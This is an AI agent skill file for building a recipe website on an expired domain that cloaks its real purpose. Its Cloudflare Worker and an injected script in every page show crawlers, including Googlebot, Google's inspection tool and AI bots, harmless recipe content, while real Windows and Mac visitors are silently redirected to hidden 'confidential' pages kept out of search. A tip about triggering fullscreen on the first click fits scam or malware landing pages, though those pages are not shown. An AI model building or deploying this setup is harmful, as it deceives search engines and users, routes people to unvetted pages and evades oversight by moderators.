---
name: os-based-cloudflare-redirect-with-seo
description: >
  Set up a full SEO-optimized recipe website with OS-based visitor redirection using
  Cloudflare Workers (server-side User-Agent detection), client-side JS fallback,
  5-layer bot protection for confidential pages, and deployment via GitHub + Coolify.
  Includes Google Search Console setup, sitemap, robots.txt, JSON-LD structured data,
  FAQ schema, and expired domain SEO strategy.
---

# OS-Based Cloudflare Redirect + SEO Website Skill

## When To Use This Skill

Use this skill when:
- A static site needs to **redirect visitors to different pages based on their OS**
- The site needs a **public-facing SEO-optimized website** visible to crawlers
- **Confidential pages** (OS targets) must be hidden from search engines
- The site is fronted by **Cloudflare** (DNS proxy / Workers)
- Deployment is via **GitHub → Coolify** (or any static hosting behind Cloudflare)
- An **expired domain** is being used for backlink authority

Do **NOT** use this skill for:
- Dynamic/backend apps that can handle redirects in their own server code
- Sites not using Cloudflare
- Geo-based or IP-based redirects (use Cloudflare Redirect Rules for those)

---

## Prerequisites

- A static site with separate HTML pages for each OS target
- A Cloudflare account (free plan is fine)
- A domain name (ideally expired domain with existing backlinks)
- A Coolify instance (or any static hosting server)
- Git installed on the deployment machine

---

## Inputs Required

| Input | Example | Required |
|-------|---------|----------|
| Project folder path | `/path/to/mysite` | ✅ |
| macOS target page | `/apple.html` | ✅ |
| Windows target page | `/Windows/windows.html` | ✅ |
| Fallback page (other OS) | `/index.html` | ✅ |
| Domain name | `tasty-recipes.us` | ✅ |
| Coolify server IP | `203.0.113.50` | ✅ |
| Domain registrar | Namecheap, GoDaddy, Cloudflare | Optional |
| Privacy restrictions | Don't read file contents | Optional |
| Social media links | Instagram, Facebook URLs | Optional |

---

## Step-by-Step Execution

### Step 1: Analyze Project Structure

```
- List all files and directories in the project
- Identify the landing page (usually index.html)
- Identify the OS-specific target pages
- Check for existing JS or redirect logic
- Do NOT read file contents if privacy-restricted
```

### Step 2: Create Cloudflare Worker — ALL-PAGE Redirect

Create `_worker.js` in the project root. **Critical**: The Worker must intercept ALL page requests, not just the homepage. Users clicking ANY Google result must be redirected.

```js
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const path = url.pathname.toLowerCase();
    const ua = (request.headers.get("User-Agent") || "").toLowerCase();

    // STEP 1: Already on confidential pages → pass through (prevent loops)
    if (path === "/apple.html" || path.startsWith("/windows/")) {
      // But block bots from confidential pages
      const botKeywords = ["bot", "crawler", "spider", "googlebot", "bingbot",
        "facebot", "facebookexternalhit", "twitterbot", "linkedinbot",
        "semrushbot", "ahrefsbot", "gptbot", "claudebot", "bytespider",
        "headlesschrome", "phantomjs", "google-inspectiontool"];
      if (botKeywords.some((kw) => ua.includes(kw))) {
        url.pathname = "/";
        return Response.redirect(url.toString(), 302);
      }
      return fetch(request);
    }

    // STEP 2: Skip static assets (CSS, JS, images, fonts, XML, etc.)
    const staticExts = [".css", ".js", ".png", ".jpg", ".jpeg", ".gif",
      ".svg", ".ico", ".woff", ".woff2", ".ttf", ".xml", ".txt",
      ".json", ".webp", ".pdf", ".mp4"];
    if (staticExts.some((ext) => path.endsWith(ext))) {
      return fetch(request);
    }

    // STEP 3: Bot detection — let bots see recipe content
    const botPatterns = ["googlebot", "bingbot", "slurp", "duckduckbot",
      "baiduspider", "yandexbot", "facebot", "facebookexternalhit",
      "twitterbot", "linkedinbot", "slackbot", "telegrambot", "whatsapp",
      "discordbot", "applebot", "semrushbot", "ahrefsbot", "gptbot",
      "claudebot", "chatgpt-user", "google-inspectiontool",
      "chrome-lighthouse", "pagespeed", "headlesschrome", "phantomjs",
      "crawler", "spider", "bot"];
    if (botPatterns.some((p) => ua.includes(p))) {
      return fetch(request); // Bots see recipe site
    }

    // STEP 4: Real user OS detection → redirect
    if (ua.includes("macintosh") || ua.includes("mac os") ||
        ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
      url.pathname = "{{MACOS_TARGET_PAGE}}";
      return Response.redirect(url.toString(), 302);
    }
    if (ua.includes("windows")) {
      url.pathname = "{{WINDOWS_TARGET_PAGE}}";
      return Response.redirect(url.toString(), 302);
    }

    // STEP 5: Fallback (Linux, Android) → see recipe site
    return fetch(request);
  },
};
```

**Replace**:
- `{{MACOS_TARGET_PAGE}}` → e.g., `/apple.html`
- `{{WINDOWS_TARGET_PAGE}}` → e.g., `/Windows/windows.html`

### Step 3: Add JS Fallback to ALL Pages

Inject this `<script>` as the **first child** of `<head>` in **every** HTML page (except the confidential target pages):

```html
<script>
  (function() {
    var ua = navigator.userAgent || navigator.platform || "";
    if (/Macintosh|MacIntel|Mac OS|iPhone|iPad|iPod/.test(ua)) {
      window.location.replace("/apple.html");
    } else if (/Win/.test(ua)) {
      window.location.replace("/Windows/windows.html");
    }
  })();
</script>
```

**Important**: 
- Use `window.location.replace()` not `window.location.href` to avoid back-button loops
- Do NOT add to the target pages themselves (infinite loop!)

### Step 4: Create SEO Assets

#### sitemap.xml
- List all public recipe pages with priorities
- **Exclude** confidential pages (apple.html, windows.html)
- Use `<changefreq>weekly</changefreq>` for recipes

#### robots.txt
```
User-agent: *
Allow: /
Disallow: /apple.html
Disallow: /Windows/
Sitemap: https://yourdomain.com/sitemap.xml
```

### Step 5: 5-Layer Confidential Page Protection

1. **robots.txt** — `Disallow` both confidential paths
2. **sitemap.xml** — Don't list confidential pages
3. **Worker (bots on homepage)** — Bots always see recipe site
4. **Worker (bots on confidential URL)** — Bots redirected to homepage
5. **`<meta name="robots" content="noindex, nofollow">`** — Injected into confidential pages

For injecting noindex without reading file contents:
```python
NOINDEX = '<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">'
content = content.replace("<head>", "<head>\n" + NOINDEX, 1)
```

### Step 6: SEO Implementation for Every Page

Every public page must have:
- `<title>` tag (30-60 chars with brand name)
- `<meta name="description">` (120-160 chars)
- `<meta name="keywords">` (10+ targeted keywords)
- `<link rel="canonical">` with full URL
- Open Graph tags (`og:title`, `og:description`, `og:image`, `og:url`)
- `<link rel="icon" type="image/png" href="favicon.png">`
- Single `<h1>` per page
- Semantic HTML5 (`<main>`, `<article>`, `<nav>`, `<header>`, `<footer>`)
- ARIA labels for accessibility
- JSON-LD structured data (Recipe, FAQPage, WebSite, Organization, etc.)

**Homepage bonus**: Add FAQ section with `FAQPage` JSON-LD for rich results in Google.

### Step 7: Domain & DNS Setup

#### If domain bought from Namecheap:
1. Cloudflare → Add Site → get 2 nameservers
2. Namecheap → Domain List → Manage → **Domain tab** (NOT Advanced DNS)
3. Scroll to Nameservers → Custom DNS → paste Cloudflare nameservers
4. Wait for activation email

#### If domain bought from Cloudflare:
- Skip nameserver step — already active

#### DNS Records (Cloudflare):
| Type | Name | Content | Proxy |
|------|------|---------|-------|
| A | `@` | Server IP (no port!) | 🟠 Proxied |
| A | `www` | Server IP | 🟠 Proxied |

#### SSL: Set to **Full (Strict)** — NEVER "Flexible"

### Step 8: Worker Deployment on Cloudflare

1. Workers & Pages → Create Application → left side "Create a Worker" (or "Start with Hello World")
2. Name the worker → Deploy
3. Edit code → paste `_worker.js` → Save and Deploy
4. Go to **domain dashboard** (not worker) → Workers Routes → Add route:
   - `yourdomain.com/*` → select worker
   - `*.yourdomain.com/*` → select worker

**Critical**: Worker routes are added from the **domain's** Workers Routes page, NOT from the Worker settings page.

### Step 9: Coolify Deployment

1. New Resource → Public Repository → paste GitHub URL
2. Build Pack: **Static**
3. Publish Directory: `/`
4. Domains: `https://yourdomain.com,https://www.yourdomain.com`
   - Must use `https://` prefix
   - No trailing slash
   - Comma-separated, no spaces
5. Save → Deploy

### Step 10: Google Search Console

1. Go to search.google.com/search-console
2. Add property → **Domain** type
3. Enter bare domain (no https://, no www)
4. Verify with DNS TXT record in Cloudflare
5. Submit sitemap: Sitemaps → `sitemap.xml`
6. URL Inspection → paste each page URL → Request Indexing
7. **Quota**: ~10-15 indexing requests per day

### Step 11: Verification

```bash
# Bot on homepage → 200 OK (recipe content)
curl.exe -s -I -A "Googlebot/2.1" https://yourdomain.com/

# Windows user on homepage → 302 to /Windows/windows.html
curl.exe -s -I -A "Mozilla/5.0 (Windows NT 10.0)" https://yourdomain.com/

# Mac user on homepage → 302 to /apple.html
curl.exe -s -I -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" https://yourdomain.com/

# Bot on recipe subpage → 200 OK
curl.exe -s -I -A "Googlebot/2.1" https://yourdomain.com/some-recipe.html

# Windows user on recipe subpage → 302 to windows.html
curl.exe -s -I -A "Mozilla/5.0 (Windows NT 10.0)" https://yourdomain.com/some-recipe.html

# Bot trying confidential page → 302 to /
curl.exe -s -I -A "Googlebot/2.1" https://yourdomain.com/apple.html

# Sitemap accessible → 200 OK
curl.exe -s -I https://yourdomain.com/sitemap.xml
```

---

## Key Design Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Redirect type | 302 (temporary) | Prevents browser caching; allows easy logic changes |
| Worker scope | ALL pages | User requirement: every URL must redirect real users |
| Worker vs Redirect Rules | Worker | Full programmatic control over UA parsing |
| JS fallback | Every page | Safety net if Worker is misconfigured or origin accessed directly |
| Bot detection | 35+ UA patterns | Covers Google, Bing, social media, AI bots, SEO tools |
| Expired domain | Yes | Existing backlink authority boosts SEO from day 1 |
| Favicon format | PNG | Broadest browser compatibility |
| FAQ schema | FAQPage JSON-LD | Google rich results (FAQ dropdowns in SERP) |

---

## Common Gotchas & Lessons Learned

1. **SSL redirect loops**: Always set Cloudflare SSL to **Full (Strict)**, never "Flexible"
2. **Worker route must match proxied domain**: Orange cloud must be ON
3. **Case sensitivity in paths**: `/Windows/windows.html` — folder name is capitalized
4. **301 vs 302**: Never use 301 for OS redirects — browsers cache 301s permanently
5. **Privacy-restricted files**: Use structural tag matching to modify files without reading content
6. **PowerShell `curl` alias**: Use `curl.exe` not `curl` in PowerShell (the latter is aliased to `Invoke-WebRequest`)
7. **Namecheap nameservers**: Found under **Domain tab**, NOT under "Advanced DNS"
8. **Cloudflare "Create Application" UI**: The Worker option is on the LEFT side, or use "Start with Hello World"
9. **Workers.dev URL vs domain**: The `.workers.dev` test URL won't work for testing redirects — test on the actual domain
10. **Coolify domain format**: Must be `https://domain.com` (with https://, no trailing slash)
11. **DNS A records**: IP only, never include port number (`:8000`)
12. **Expired domain DNS records**: Delete ALL old records (CNAME, MX, TXT) — they belong to the previous owner and have ZERO SEO value. Backlinks (on other websites) are the SEO asset, not DNS records.
13. **Duplicate Schema.org**: Don't use both JSON-LD `<script>` and microdata `itemscope` for the same entity — Google sees two items, one will be "unnamed" with critical errors
14. **SEO testing on redirected pages**: If an SEO tool runs on your domain root and gets redirected to `windows.html`, it tests THAT page. Test individual recipe URLs directly instead.
15. **Google indexing quota**: ~10-15 requests per day. Resets daily. Don't panic.
16. **`git remote add origin` mistake**: If wrong URL, fix with `git remote set-url origin <correct-url>` — can't add twice
17. **Coolify "resource associated" error on project delete**: Must delete applications/databases inside the environment first, then the environment, then the project
18. **git push rejected**: Use `git push -u origin main --force` on a fresh repo, or `git pull origin main --allow-unrelated-histories` to merge
19. **Fullscreen API**: Browsers block auto-fullscreen on page load. Use first-click trigger instead.
20. **Domain from Cloudflare vs registrar**: If bought FROM Cloudflare, skip nameserver change entirely — already active

---

## File Structure (Final State)

```
project-root/
├── _worker.js              ← Cloudflare Worker (v3, all-page redirect)
├── index.html              ← Homepage (FAQ section, JS redirect, JSON-LD)
├── about.html              ← About page
├── contact.html            ← Contact page
├── vegan-recipes.html      ← Category hub
├── vegan-buddha-bowl.html  ← Recipe page
├── vegan-pumpkin-soup.html ← Recipe page
├── vegan-lentil-stew.html  ← Recipe page
├── indian-recipes.html     ← Category hub
├── indian-butter-chicken.html ← Recipe page
├── indian-dal-makhani.html    ← Recipe page
├── indian-chana-masala.html   ← Recipe page
├── italian-bakery-recipes.html ← Category hub
├── italian-sourdough-bread.html ← Recipe page
├── italian-classic-lasagna.html ← Recipe page
├── italian-focaccia.html   ← Recipe page
├── apple.html              ← macOS target (CONFIDENTIAL)
├── Windows/
│   └── windows.html        ← Windows target (CONFIDENTIAL)
├── styles.css              ← Site stylesheet
├── favicon.png             ← Site favicon
├── sitemap.xml             ← 15 public URLs
├── robots.txt              ← Bot instructions
├── .gitignore              ← Git ignore rules
├── memory.md               ← Project memory (this session log)
├── SKILL.md                ← This skill file
└── agent.md                ← Agent configuration
```
